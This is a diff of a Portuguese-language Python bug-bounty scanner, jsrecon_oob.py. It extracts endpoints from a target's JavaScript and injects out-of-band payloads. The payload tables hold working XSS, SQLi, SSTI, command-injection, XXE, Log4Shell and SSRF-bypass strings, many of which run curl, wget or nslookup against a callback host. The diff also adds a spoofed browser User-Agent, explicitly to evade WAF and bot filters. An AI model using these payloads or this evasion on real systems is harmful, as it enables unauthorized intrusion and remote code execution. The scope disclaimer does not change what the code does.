@@ -3,6 +3,12 @@
 jsrecon_oob.py — JS Recon + OOB Injection para Bug Bounty
 Uso EXCLUSIVO em programas com escopo autorizado.
 
+PRINCÍPIO CENTRAL:
+  Nenhum parâmetro é inventado. A ferramenta extrai do .js:
+    - endpoints reais (path, query params, body params)
+    - headers mencionados no código
+  e injeta OOB APENAS nesses pontos.
+
 Fluxo:
   Fase 1 — Recon JS
     subfinder / assetfinder → subdomínios
@@ -11,22 +17,19 @@ Fluxo:
     gau + waybackurls + gospider + katana → URLs históricas
     Playwright → JS carregado em runtime
 
-  Fase 2 — Filtro rigoroso de endpoints
-    • Descarta template literals JS: ${P}, ${l}, ${A}, ${resource}
-    • Descarta domínios externos ao target (stripe, google, etc.)
-    • Aceita apenas: target.com / *.target.com / paths relativos
+  Fase 2 — Extração fiel de endpoints
+    • Extrai paths, query params e body params LITERALMENTE do JS
+    • Descarta template literals JS: ${P}, ${l}, ${A}
+    • Descarta domínios externos ao target
     • Agrupa por método: endpoints_get.txt / post / put / patch
+    • ZERO parâmetros inferidos por heurística de nome
 
   Fase 3 — OOB Injection
+    • Injeta APENAS nos params que existem no JS extraído
     • UID como subdomínio ({ID}.{OOB}) — correlação DNS garantida
-    • Injeta payload interactsh em query params, body params e path params REST
-    • Injeta nos headers HTTP (SSRF via header)
-    • Rate limit global (não por thread)
-    • SMTP OOB em campos de e-mail
-    • Detecção de metadata cloud na resposta HTTP
-    • SVG/CSV upload SSRF
-    • WebSocket OOB
-    • Monitora interactsh-client em paralelo com a injeção
+    • User-Agent realista em todas as requisições (HTTP e curl)
+    • Rate limit global
+    • Monitora interactsh-client em paralelo
 
 Uso:
   python3 jsrecon_oob.py target.com -o abc123.oast.fun
@@ -94,13 +97,23 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ─── Portas ──────────────────────────────────────────────────────────────────
+# ─── User-Agent realista ──────────────────────────────────────────────────────
+# Usado em TODAS as requisições HTTP e nos payloads curl/wget
+# para evitar bloqueio por WAF/aplicações que filtram bots.
+REAL_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/125.0.0.0 Safari/537.36"
+)
+CURL_UA_FLAG = f'-A "{REAL_UA}"'
+
+# ─── Portas ───────────────────────────────────────────────────────────────────
 HTTP_PORTS  = [80,81,443,3000,3001,4000,4443,5000,6000,6443,6885,
                7077,8000,8080,8081,8181,8443,9000,9091,9443,9999,10000]
 NMAP_PORTS  = ",".join(str(p) for p in sorted(set(HTTP_PORTS)))
 HTTPS_PORTS = {443,8443,9443,4443,6443,10000}
 
-# ─── CDNs — sempre descartados ───────────────────────────────────────────────
+# ─── CDNs — sempre descartados ────────────────────────────────────────────────
 _CDN_RE = re.compile(
     r'(?:cdnjs\.cloudflare\.com|cdn\.jsdelivr\.net|unpkg\.com|'
     r'ajax\.googleapis\.com|stackpath\.bootstrapcdn\.com|'
@@ -110,7 +123,7 @@ _CDN_RE = re.compile(
     re.I,
 )
 
-# ─── Cores ───────────────────────────────────────────────────────────────────
+# ─── Cores ────────────────────────────────────────────────────────────────────
 class C:
     RED    = "\033[91m"
     GREEN  = "\033[92m"
@@ -125,7 +138,7 @@ class C:
     def strip(s: str) -> str:
         return re.sub(r'\033\[[0-9;]*m', '', s)
 
-# ─── Logging ─────────────────────────────────────────────────────────────────
+# ─── Logging ──────────────────────────────────────────────────────────────────
 class _CleanFile(logging.FileHandler):
     def emit(self, record):
         record.msg = C.strip(str(record.msg))
@@ -187,9 +200,7 @@ def _append_line(path: Path, line: str) -> None:
     with open(path, "a", encoding="utf-8") as f:
         f.write(line + "\n")
 
-# ─── UID collision-free ──────────────────────────────────────────────────────
-# UIDs usam apenas chars válidos em DNS ([a-z0-9-]) porque são colocados
-# como subdomínio ({ID}.{OOB}) para garantir correlação via full-id DNS.
+# ─── UID collision-free ───────────────────────────────────────────────────────
 _uid_seen: set[str] = set()
 _uid_lock = threading.Lock()
 
@@ -205,10 +216,7 @@ def unique_id(category: str, param: str) -> str:
         _uid_seen.add(uid)
     return uid
 
-# ─── Rate limiter global ─────────────────────────────────────────────────────
-# FIX: delay anterior era por iteração dentro do worker — com N threads isso
-# multiplicava o throughput por N. Agora é um semáforo global que garante
-# no máximo 1 req a cada `delay` segundos, independente do nº de threads.
+# ─── Rate limiter global ──────────────────────────────────────────────────────
 class GlobalRateLimiter:
     def __init__(self, delay: float):
         self.delay = delay
@@ -223,7 +231,7 @@ class GlobalRateLimiter:
                 time.sleep(self.delay - gap)
             self._last = time.time()
 
-_rate_limiter = GlobalRateLimiter(0.3)  # sobrescrito em main()
+_rate_limiter = GlobalRateLimiter(0.3)
 
 # ─── PayloadLog ───────────────────────────────────────────────────────────────
 class PayloadLog:
@@ -257,7 +265,6 @@ class PayloadLog:
         return entry
 
     def find_fuzzy(self, raw_id: str) -> Optional[dict]:
-        """Correlação pelo full-id DNS (UID está no subdomínio)."""
         with self._lock:
             for uid, entry in self._by_uid.items():
                 if uid in raw_id:
@@ -265,10 +272,6 @@ class PayloadLog:
         return None
 
     def find_fuzzy_in_request(self, raw_request: str) -> Optional[dict]:
-        """
-        FIX: fallback para hits HTTP onde o UID chega no path/body
-        (não no subdomínio DNS) — varredura do raw_request.
-        """
         with self._lock:
             for uid, entry in self._by_uid.items():
                 if uid in raw_request:
@@ -285,7 +288,7 @@ class PayloadLog:
                 except Exception:
                     pass
 
-# ─── Fase 1-A: Subdomínios ───────────────────────────────────────────────────
+# ─── Fase 1-A: Subdomínios ────────────────────────────────────────────────────
 def enum_subdomains(domain: str, out: Path, lg: logging.Logger) -> set[str]:
     import os
     subs: set[str] = set()
@@ -319,7 +322,7 @@ def enum_subdomains(domain: str, out: Path, lg: logging.Logger) -> set[str]:
     clog(lg, f"  Total únicos: {len(clean)}", C.GREEN + C.BOLD)
     return clean
 
-# ─── Fase 1-B: Nmap ──────────────────────────────────────────────────────────
+# ─── Fase 1-B: Nmap ───────────────────────────────────────────────────────────
 def nmap_scan(subs: set[str], out: Path, lg: logging.Logger) -> dict[str, list[int]]:
     clog(lg, f"\n━━━ Nmap ({len(subs)} hosts) ━━━", C.BLUE + C.BOLD)
     if not tool_ok("nmap"):
@@ -354,7 +357,7 @@ def nmap_scan(subs: set[str], out: Path, lg: logging.Logger) -> dict[str, list[i
     clog(lg, f"  Portas abertas: {total}", C.GREEN)
     return open_ports
 
-# ─── Fase 1-C: httpx ─────────────────────────────────────────────────────────
+# ─── Fase 1-C: httpx ──────────────────────────────────────────────────────────
 def httpx_probe(open_ports: dict[str, list[int]], out: Path,
                 lg: logging.Logger) -> tuple[list[str], set[str]]:
     clog(lg, "\n━━━ httpx ━━━", C.BLUE + C.BOLD)
@@ -378,7 +381,8 @@ def httpx_probe(open_ports: dict[str, list[int]], out: Path,
     try:
         result = subprocess.run(
             ["httpx", "-silent", "-mc", "200,201,204,301,302,307,308,401,403",
-             "-threads", "50", "-timeout", "8", "-follow-redirects"],
+             "-threads", "50", "-timeout", "8", "-follow-redirects",
+             "-H", f"User-Agent: {REAL_UA}"],
             input="\n".join(sorted(candidates)) + "\n",
             capture_output=True, text=True, timeout=600,
         )
@@ -497,11 +501,7 @@ async def _pw_crawl(url: str, timeout_s: int, wait_s: int,
     async with async_playwright() as pw:
         browser = await pw.chromium.launch(headless=headless)
         ctx = await browser.new_context(
-            user_agent=(
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                "AppleWebKit/537.36 (KHTML, like Gecko) "
-                "Chrome/124.0.0.0 Safari/537.36"
-            ),
+            user_agent=REAL_UA,
             ignore_https_errors=True,
         )
         page = await ctx.new_page()
@@ -535,7 +535,7 @@ async def playwright_all(targets: list[str], headless: bool,
             lg.error("  [browser] %s: %s", url, e)
     return all_js
 
-# ─── Fase 2: Filtro de endpoints ─────────────────────────────────────────────
+# ─── Fase 2: Filtro de endpoints ──────────────────────────────────────────────
 _TMPL_LITERAL  = re.compile(r'\$\{[^}]*\}')
 _JS_CONCAT     = re.compile(r'"\s*\+\s*\w|\w\s*\+\s*"')
 _STATIC_EXT    = re.compile(
@@ -546,14 +546,13 @@ _ASSET_PATH    = re.compile(
     r'(?:/__webpack|/static/|/assets/|/dist/|/build/|\.chunk\.js|\.bundle\.js)',
     re.I
 )
-# Filtros adicionais de qualidade de endpoints
-_TRAILING_JUNK = re.compile(r'[\\)\]]+$')          # \\ ) ] no final do path
-_BUILD_PATH    = re.compile(                           # paths de build/CI/filesystem
+_TRAILING_JUNK = re.compile(r'[\\)\]]+$')
+_BUILD_PATH    = re.compile(
     r'/(?:node_modules|builds/|src/locales|src/pages|\.cache)',
     re.I
 )
-_STATUS_CODE   = re.compile(r'^/\d{3}$')             # /404, /412, /200 etc
-_TOO_SHORT     = re.compile(r'^/[a-zA-Z0-9_]{1,3}$')  # /tmp, /mod, /js
+_STATUS_CODE   = re.compile(r'^/\d{3}$')
+_TOO_SHORT     = re.compile(r'^/[a-zA-Z0-9_]{1,3}$')
 
 def is_valid_endpoint(path: str, target_domain: str,
                       confirmed_hosts: set[str]) -> tuple[bool, str]:
@@ -564,24 +563,17 @@ def is_valid_endpoint(path: str, target_domain: str,
     if _JS_CONCAT.search(path):
         return False, "js_concat"
 
-    # Remove lixo de extração: \\ ) ] no final do path
     path = _TRAILING_JUNK.sub("", path).rstrip("/") or path
-
     clean_path = path.split("?")[0]
+
     if _STATIC_EXT.search(clean_path):
         return False, "static_asset"
     if _ASSET_PATH.search(path):
         return False, "framework_asset"
-
-    # Paths de build/filesystem/CI — nunca são endpoints de API
     if _BUILD_PATH.search(path):
         return False, "build_path"
-
-    # Status codes HTTP como paths: /404, /412, /200
     if _STATUS_CODE.match(path):
         return False, "status_code_path"
-
-    # Paths muito curtos: /tmp, /mod, /js, /en
     if _TOO_SHORT.match(path):
         return False, "too_short_path"
 
@@ -606,11 +598,6 @@ def is_valid_endpoint(path: str, target_domain: str,
 
 
 def resolve_endpoint_url(path: str, js_url: str, target_domain: str) -> str:
-    """
-    FIX: usa urljoin para paths relativos, respeitando ../ e caminhos sem /.
-    Antes: path relativo sem / virava /<path> ignorando o contexto do JS.
-    Agora: urljoin(js_url, path) resolve corretamente contra a URL do arquivo JS.
-    """
     if path.startswith(("http://", "https://", "ws://", "wss://")):
         return path
     if path.startswith("/"):
@@ -618,10 +605,9 @@ def resolve_endpoint_url(path: str, js_url: str, target_domain: str) -> str:
         if parsed.scheme and parsed.netloc:
             return f"{parsed.scheme}://{parsed.netloc}{path}"
         return f"https://{target_domain}{path}"
-    # Path relativo (sem /) — resolve contra a URL do JS
     return urljoin(js_url, path)
 
-# ─── Padrões de extração de endpoints ────────────────────────────────────────
+# ─── Padrões de extração de endpoints ─────────────────────────────────────────
 def _endpoint_patterns() -> list[tuple[str, re.Pattern, str]]:
     Q  = r'[\x22\x27\x60]'
     NQ = r'[^\x22\x27\x60\s]'
@@ -633,12 +619,8 @@ def _endpoint_patterns() -> list[tuple[str, re.Pattern, str]]:
         ("fetch_delete",    re.compile(rf'(?:axios\.delete|http\.delete)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "DELETE"),
         ("fetch_patch",     re.compile(rf'(?:axios\.patch|http\.patch)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "PATCH"),
         ("fetch_method",    re.compile(rf'fetch\s*\(\s*{Q}({NQ}{{3,}}){Q}\s*,\s*\{{[^}}]*method\s*:\s*[\x22\x27](\w+)[\x22\x27]', I), "DYNAMIC"),
-        # fetch_baseurl: extrai sufixo de path de template literals com baseURL variável
-        # Ex: axios.get(`${base}/v1/teams/`)      →  /v1/teams/
-        # Ex: this.api.get(`${this.url}/v2/apps`) →  /v2/apps
-        ("fetch_baseurl",  re.compile(r'(?:fetch|axios\.(?:get|post|put|patch|delete)|this\.\w+\.(?:get|post|put|patch))\s*\(\s*\x60\$\{[^}]+\}(/[a-zA-Z0-9/_\-]{2,}(?:\$\{[^}]*\}[a-zA-Z0-9/_\-]*)*)\x60', I), "ANY"),
-        # fetch_baseurl_m: idem com { method: 'POST' }
-        ("fetch_baseurl_m",re.compile(r'fetch\s*\(\s*\x60\$\{[^}]+\}(/[a-zA-Z0-9/_\-]{2,}[^\x60]*)\x60\s*,\s*\{[^}]*method\s*:\s*[\x22\x27](\w+)[\x22\x27]', I), "DYNAMIC"),
+        ("fetch_baseurl",   re.compile(r'(?:fetch|axios\.(?:get|post|put|patch|delete)|this\.\w+\.(?:get|post|put|patch))\s*\(\s*\x60\$\{[^}]+\}(/[a-zA-Z0-9/_\-]{2,}(?:\$\{[^}]*\}[a-zA-Z0-9/_\-]*)*)\x60', I), "ANY"),
+        ("fetch_baseurl_m", re.compile(r'fetch\s*\(\s*\x60\$\{[^}]+\}(/[a-zA-Z0-9/_\-]{2,}[^\x60]*)\x60\s*,\s*\{[^}]*method\s*:\s*[\x22\x27](\w+)[\x22\x27]', I), "DYNAMIC"),
         ("xhr_open",        re.compile(rf'\.open\s*\(\s*[\x22\x27](\w+)[\x22\x27]\s*,\s*{Q}({NQ}{{3,}}){Q}', I), "XHR"),
         ("api_versioned",   re.compile(rf'{Q}(/api/v\d+[a-zA-Z0-9/_\-]*(?:\?[^\s\x22\x27\x60]*)?){Q}'), "ANY"),
         ("graphql",         re.compile(rf'{Q}((?:/graphql|/gql)(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "POST"),
@@ -675,20 +657,18 @@ def _endpoint_patterns() -> list[tuple[str, re.Pattern, str]]:
 
 ENDPOINT_PATTERNS = _endpoint_patterns()
 
-# Labels cuja semântica é claramente GET ou POST — usados na inferência de método
-# FIX: evita que endpoints router/href caiam em POST por falta de query string.
 _GET_LABELS: set[str] = {
     "fetch_get", "api_versioned", "versioned_path",
     "router_path", "href_action", "url_with_query",
     "generic_path", "path_param_ssrf", "iframe_src",
-    "fetch_baseurl",   # template literal com baseURL variável → GET por padrão
+    "fetch_baseurl",
 }
 _POST_LABELS: set[str] = {
     "fetch_post", "fetch_put", "fetch_patch",
     "graphql", "graphql_url", "webhook_url",
 }
 
-# ─── Extração de body params ──────────────────────────────────────────────────
+# ─── Extração de body params do JS ────────────────────────────────────────────
 _BODY_RE = re.compile(
     r'(?:body|data|payload)\s*[:=]\s*(?:JSON\.stringify\s*)?\{([^}]{1,600})\}',
     re.I | re.DOTALL
@@ -705,16 +685,50 @@ def extract_body_params(content: str, pos: int) -> list[str]:
                 params.append(k)
     return list(dict.fromkeys(params))
 
-# FIX: extrai parâmetros de path REST (:id, {orderId}, <param>)
+# ─── Extração de headers mencionados no JS ────────────────────────────────────
+# Extrai apenas headers que o código JS menciona explicitamente.
+# Esses são os únicos headers injetados na Fase 3.
+_HEADER_RE = re.compile(
+    r'["\']([A-Za-z][A-Za-z0-9\-]{2,40})["\']'
+    r'\s*:\s*'
+    r'["\']([^"\']{1,200})["\']',
+)
+_KNOWN_HTTP_HEADERS = {
+    "content-type", "authorization", "accept", "x-api-key",
+    "x-auth-token", "x-access-token", "token", "api-key",
+    "x-requested-with", "x-csrf-token", "x-request-id",
+    "x-correlation-id", "x-forwarded-for", "x-real-ip",
+    "origin", "referer", "cookie", "user-agent",
+    "accept-language", "accept-encoding", "cache-control",
+    "content-length", "x-custom-header",
+}
+
+def extract_js_headers(content: str) -> dict[str, str]:
+    """
+    Extrai headers que o JS menciona explicitamente em fetch/XHR.
+    Retorna {header_name: valor_original}.
+    """
+    found: dict[str, str] = {}
+    # Busca blocos headers: { ... } próximos a fetch/axios
+    header_blocks = re.findall(
+        r'headers\s*:\s*\{([^}]{1,800})\}',
+        content, re.I | re.DOTALL
+    )
+    for block in header_blocks:
+        for m in _HEADER_RE.finditer(block):
+            name = m.group(1)
+            val  = m.group(2)
+            if name.lower() in _KNOWN_HTTP_HEADERS or name.startswith(("X-", "x-")):
+                found[name] = val
+    return found
+
 _PATH_PARAM_RE = re.compile(r'[:{<]([a-zA-Z][a-zA-Z0-9_]{1,30})[}>]?')
 
 def extract_path_params(url: str) -> list[str]:
-    """Extrai nomes de path params REST — ex: /api/users/:id → ['id']."""
     path = urlparse(url).path
     return _PATH_PARAM_RE.findall(path)
 
 def inject_path_param(url: str, param: str, value: str) -> str:
-    """Substitui :param ou {param} no path da URL pelo valor encodado."""
     parsed = urlparse(url)
     new_path = re.sub(
         rf'(?::{re.escape(param)}|\{{{re.escape(param)}\}}|<{re.escape(param)}>)',
@@ -738,6 +752,9 @@ def analyze_js_content(content: str, js_url: str,
         except Exception:
             pass
 
+    # Extrai headers mencionados neste arquivo JS
+    js_headers = extract_js_headers(content)
+
     found = []
     for label, pattern, method_hint in ENDPOINT_PATTERNS:
         for m in pattern.finditer(content):
@@ -754,8 +771,6 @@ def analyze_js_content(content: str, js_url: str,
             if not path:
                 continue
 
-            # fetch_baseurl: mantém só parte fixa antes de ${varId}
-            # Ex: /v1/apps/${appId}/settings → /v1/apps
             if label in ("fetch_baseurl", "fetch_baseurl_m") and _TMPL_LITERAL.search(path):
                 path = _TMPL_LITERAL.split(path)[0].rstrip("/") or path
                 if not path or len(path) < 3:
@@ -766,7 +781,6 @@ def analyze_js_content(content: str, js_url: str,
                 lg.debug("  [DROP][%s] %s → %s", reason, path[:80], js_url)
                 continue
 
-            # FIX: usa urljoin-based resolve para paths relativos
             abs_url = resolve_endpoint_url(path, js_url, target_domain)
 
             key = (method if method != "ANY" else "*",
@@ -776,10 +790,15 @@ def analyze_js_content(content: str, js_url: str,
                     continue
                 _seen_endpoints.add(key)
 
+            # Query params extraídos LITERALMENTE do path
             query_params = ""
             if "?" in path:
-                query_params = path.split("?", 1)[1].split("#")[0]
+                raw_qs = path.split("?", 1)[1].split("#")[0]
+                # Remove template literals dos valores mas mantém os nomes
+                clean_qs = _TMPL_LITERAL.sub("__OOB__", raw_qs)
+                query_params = clean_qs
 
+            # Body params extraídos do contexto JS adjacente
             body_params: list[str] = []
             if method in ("POST", "PUT", "PATCH", "DYNAMIC", "ANY"):
                 body_params = extract_body_params(content, m.start())
@@ -790,6 +809,7 @@ def analyze_js_content(content: str, js_url: str,
                 "absolute_url": abs_url,
                 "query_params": query_params,
                 "body_params":  body_params,
+                "js_headers":   js_headers,   # headers mencionados no JS
                 "js_source":    js_url,
                 "origin_host":  urlparse(js_url).netloc or target_domain,
                 "label":        label,
@@ -821,7 +841,7 @@ def process_one_js(url: str, target_domain: str, confirmed_hosts: set[str],
     if cf.exists() and not cfg.get("no_cache"):
         try:
             d = json.loads(cf.read_text(encoding="utf-8"))
-            if d.get("v") == "3" and time.time() - d.get("ts", 0) < 86400:
+            if d.get("v") == "4" and time.time() - d.get("ts", 0) < 86400:
                 return analyze_js_content(d["c"], url, target_domain,
                                           confirmed_hosts, lg)
         except Exception:
@@ -843,7 +863,7 @@ def process_one_js(url: str, target_domain: str, confirmed_hosts: set[str],
         try:
             cf.parent.mkdir(parents=True, exist_ok=True)
             cf.write_text(
-                json.dumps({"v": "3", "ts": time.time(), "c": content},
+                json.dumps({"v": "4", "ts": time.time(), "c": content},
                            ensure_ascii=False),
                 encoding="utf-8",
             )
@@ -868,7 +888,7 @@ def _make_get_fn(cfg: dict):
         kw.setdefault("proxies", {"http": proxy, "https": proxy} if proxy else None)
         return requests.get(
             url,
-            headers={"User-Agent": "Mozilla/5.0 (compatible; jsrecon_oob/1.0)"},
+            headers={"User-Agent": REAL_UA},
             timeout=cfg.get("timeout", 10),
             verify=False, allow_redirects=True, **kw,
         )
@@ -931,6 +951,8 @@ def save_endpoints_by_method(endpoints: list[dict], out: Path,
                 line += "?" + ep["query_params"]
             if ep.get("body_params"):
                 line += f"  # body: {', '.join(ep['body_params'])}"
+            if ep.get("js_headers"):
+                line += f"  # headers: {', '.join(ep['js_headers'].keys())}"
             lines.append(line)
         _write(fname, lines, lg)
         files[method] = fname
@@ -943,26 +965,20 @@ def save_endpoints_by_method(endpoints: list[dict], out: Path,
 
     return files
 
-# ─── Fase 3: Payloads OOB ────────────────────────────────────────────────────
+# ─── Fase 3: Payloads OOB ─────────────────────────────────────────────────────
 #
-# IMPORTANTE: todos os payloads SSRF/DNS usam {ID}.{OOB} como subdomínio.
-# O interactsh registra o subdomínio no campo full-id do hit DNS — que é
-# o que PayloadLog.find_fuzzy() indexa. Com UID no path ({OOB}/{ID}),
-# o full-id retorna apenas o host sem o ID, quebrando a correlação.
+# REGRA CENTRAL: cada payload curl/wget usa -A com REAL_UA.
+# Isso garante que requests OOB não sejam bloqueadas por WAF/CDN
+# que filtram User-Agents de ferramentas (curl/1.x, python-requests, etc).
 #
 OOB_PAYLOADS: dict[str, list[str]] = {
-    # ── XSS ──────────────────────────────────────────────────────────────────
     "xss": [
         '"><img src="https://{ID}.{OOB}/" onerror=x>',
         "'><script src=https://{ID}.{OOB}/></script>",
         '"><svg/onload=fetch(`https://{ID}.{OOB}/`)>',
         '"><details open ontoggle=fetch(`https://{ID}.{OOB}/`)>',
         '"><iframe src="https://{ID}.{OOB}/">',
-        '"><object data="https://{ID}.{OOB}/">',
-        "javascript:fetch('https://{ID}.{OOB}/')//?",
     ],
-
-    # ── SSRF direto — UID no subdomínio ──────────────────────────────────────
     "ssrf": [
         "https://{ID}.{OOB}/",
         "http://{ID}.{OOB}/",
@@ -971,8 +987,6 @@ OOB_PAYLOADS: dict[str, list[str]] = {
         "ldap://{ID}.{OOB}/",
         "sftp://{ID}.{OOB}/",
     ],
-
-    # ── SSRF bypass de filtros — UID no subdomínio ────────────────────────────
     "ssrf_bypass": [
         "http://0/{ID}",
         "http://0x7f000001/{ID}",
@@ -984,64 +998,34 @@ OOB_PAYLOADS: dict[str, list[str]] = {
         "http://{ID}.{OOB}%2F",
         "//[{ID}.{OOB}]/",
         "http://{ID}.{OOB}\t/",
-        # DNS rebind helpers
         "http://127.0.0.1.{ID}.{OOB}/",
-        "http://localtest.me/{ID}",
     ],
-
-    # ── Cloud metadata — detectados pela resposta HTTP, não por OOB ──────────
-    # Estes NÃO geram callback no interactsh. São verificados em
-    # check_cloud_metadata_in_response() após analisar o corpo da resposta.
-    # Listados aqui apenas para documentação — não são injetados como OOB.
-    # "cloud_metadata": [
-    #     "http://169.254.169.254/latest/meta-data/",
-    #     "http://metadata.google.internal/computeMetadata/v1/",
-    #     "http://100.100.100.200/latest/meta-data/",
-    #     "http://169.254.169.254/metadata/instance",
-    # ],
-
-    # ── SQLi OOB — UID no subdomínio DNS ─────────────────────────────────────
     "sqli": [
-        # MySQL — UNC com subdomínio
         "' AND 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\','{ID}','.{OOB}','\\\\a'))-- -",
-        # MySQL — hex encoded (FIX: hex_oob calculado em tempo de execução)
-        # placeholder {HEX_OOB} substituído em _build_payload()
         "' AND 1=1 AND LOAD_FILE(0x{HEX_OOB})-- -",
-        # MSSQL — xp_dirtree com subdomínio
         "'; EXEC master..xp_dirtree '\\\\{ID}.{OOB}\\share';-- -",
-        # PostgreSQL — dblink com subdomínio
         "'; SELECT dblink_connect('host={ID}.{OOB} dbname=a user=a');-- -",
-        # Oracle — UTL_HTTP com subdomínio
         "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{ID}.{OOB}/') FROM dual)-- -",
     ],
-
-    # ── SSTI — múltiplos engines ──────────────────────────────────────────────
     "ssti": [
-        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{ID}.{OOB}/'],stdout=-1).communicate()}}",
-        "${__import__('os').popen('curl https://{ID}.{OOB}/').read()}",
-        "<%= `curl https://{ID}.{OOB}/` %>",
-        '${"curl https://{ID}.{OOB}/".execute().text}',
-        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl https://{ID}.{OOB}/")}',
-        "{php}shell_exec('curl https://{ID}.{OOB}/');{/php}",
-        "{{['curl https://{ID}.{OOB}/']|filter('system')}}",
-        "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"curl https://{ID}.{OOB}/\")')()}}",
-        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('curl https://{ID}.{OOB}/'))$ex",
+        # UA incluído nos payloads curl dentro de SSTI
+        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','-A','" + REAL_UA + "','https://{ID}.{OOB}/'],stdout=-1).communicate()}}",
+        "${__import__('os').popen('curl -A \"" + REAL_UA + "\" https://{ID}.{OOB}/').read()}",
+        "<%= `curl -A '" + REAL_UA + "' https://{ID}.{OOB}/` %>",
+        '${"curl -A \\"' + REAL_UA + '\\" https://{ID}.{OOB}/".execute().text}',
+        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl -A \\"' + REAL_UA + '\\" https://{ID}.{OOB}/")}',
+        "{{['curl','-A','" + REAL_UA + "','https://{ID}.{OOB}/']|filter('system')}}",
     ],
-
-    # ── RCE ──────────────────────────────────────────────────────────────────
     "rce": [
-        "; curl https://{ID}.{OOB}/ #",
-        "$(curl https://{ID}.{OOB}/)",
-        "`curl https://{ID}.{OOB}/`",
-        "| curl https://{ID}.{OOB}/",
-        "\ncurl https://{ID}.{OOB}/\n",
-        "%3B+curl+https%3A%2F%2F{ID}.{OOB}%2F",
-        "; Invoke-WebRequest https://{ID}.{OOB}/ #",
-        "; wget https://{ID}.{OOB}/ #",
-        "; nslookup {ID}.{OOB} #",
+        f'; curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/ #',
+        f'$(curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/)',
+        f'`curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/`',
+        f'| curl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/',
+        f'\ncurl -A "{REAL_UA}" https://{{ID}}.{{OOB}}/\n',
+        f'; wget --user-agent="{REAL_UA}" https://{{ID}}.{{OOB}}/ #',
+        f'; nslookup {{ID}}.{{OOB}} #',
+        f'; Invoke-WebRequest -UserAgent "{REAL_UA}" https://{{ID}}.{{OOB}}/ #',
     ],
-
-    # ── Open Redirect ─────────────────────────────────────────────────────────
     "redirect": [
         "https://{ID}.{OOB}/",
         "//https://{ID}.{OOB}/",
@@ -1049,19 +1033,13 @@ OOB_PAYLOADS: dict[str, list[str]] = {
         "@{ID}.{OOB}/",
         "https://{ID}.{OOB}%2F",
         "https:/%5C%5C{ID}.{OOB}/",
-        "https://{ID}.{OOB};@legit.com/",
-        "javascript:fetch('https://{ID}.{OOB}/')",
     ],
-
-    # ── XXE ──────────────────────────────────────────────────────────────────
     "xxe": [
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://{ID}.{OOB}/">]><r>&x;</r>',
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % oob SYSTEM "https://{ID}.{OOB}/">%oob;]>',
         '<?xml version="1.0"?><!DOCTYPE r SYSTEM "https://{ID}.{OOB}/">',
         '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://{ID}.{OOB}/"/></svg>',
     ],
-
-    # ── Log4Shell ─────────────────────────────────────────────────────────────
     "log4shell": [
         "${{jndi:ldap://{ID}.{OOB}/{ID}}}",
         "${{j${{::-n}}di:ldap://{ID}.{OOB}/{ID}}}",
@@ -1070,84 +1048,56 @@ OOB_PAYLOADS: dict[str, list[str]] = {
         "${{jndi:ldaps://{ID}.{OOB}/{ID}}}",
         "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{ID}.{OOB}/{ID}}}",
         "${{${{lower:j}}ndi:ldap://{ID}.{OOB}/{ID}}}",
-        "${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{ID}.{OOB}/{ID}}}",
     ],
-
-    # ── GraphQL — body estruturado ────────────────────────────────────────────
-    # FIX: payload é um JSON completo de query GraphQL, não um valor de campo.
-    # Injetado diretamente como body (não como valor de parâmetro).
     "graphql": [
         '{{"query":"{{ importUrl(url:\\"https://{ID}.{OOB}/\\") }}"}}',
         '{{"query":"{{ fetchUrl(url:\\"https://{ID}.{OOB}/\\") }}"}}',
         '{{"query":"mutation {{ uploadFromUrl(url:\\"https://{ID}.{OOB}/\\") {{ id }} }}"}}',
     ],
-
-    # ── SMTP OOB — campo de e-mail gera DNS lookup do MX ─────────────────────
-    # Hit aparece como protocolo "smtp" ou "dns" no interactsh.
     "smtp": [
         "user@{ID}.{OOB}",
         "admin@{ID}.{OOB}",
         "<user@{ID}.{OOB}>",
         '"OOB Test" <oob@{ID}.{OOB}>',
     ],
-
-    # ── Upload SSRF — conteúdos que forçam fetch pelo servidor ───────────────
-    # Útil em endpoints /import, /upload?url=, /fetch?src=
     "upload_ssrf": [
-        # SVG com fetch externo (servidor que renderiza SVG faz o fetch)
         '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://{ID}.{OOB}/"/></svg>',
-        # CSV com fórmula de importação (Google Sheets / Excel Online)
         '=IMPORTDATA("https://{ID}.{OOB}/")',
-        '=HYPERLINK("https://{ID}.{OOB}/","x")',
-        # HTML com meta redirect (headless renderers)
         '<meta http-equiv="refresh" content="0;url=https://{ID}.{OOB}/">',
-        # XML externo
         '<?xml version="1.0"?><!DOCTYPE x SYSTEM "https://{ID}.{OOB}/">',
     ],
-
-    # ── WebSocket OOB ─────────────────────────────────────────────────────────
     "websocket": [
         '{{"type":"connect","url":"https://{ID}.{OOB}/"}}',
         '{{"action":"subscribe","endpoint":"https://{ID}.{OOB}/"}}',
         '{{"cmd":"fetch","target":"https://{ID}.{OOB}/"}}',
-        '{{"event":"message","data":"https://{ID}.{OOB}/"}}',
     ],
-
-    # ── Log injection (Graylog / Splunk / newline) ────────────────────────────
     "log_injection": [
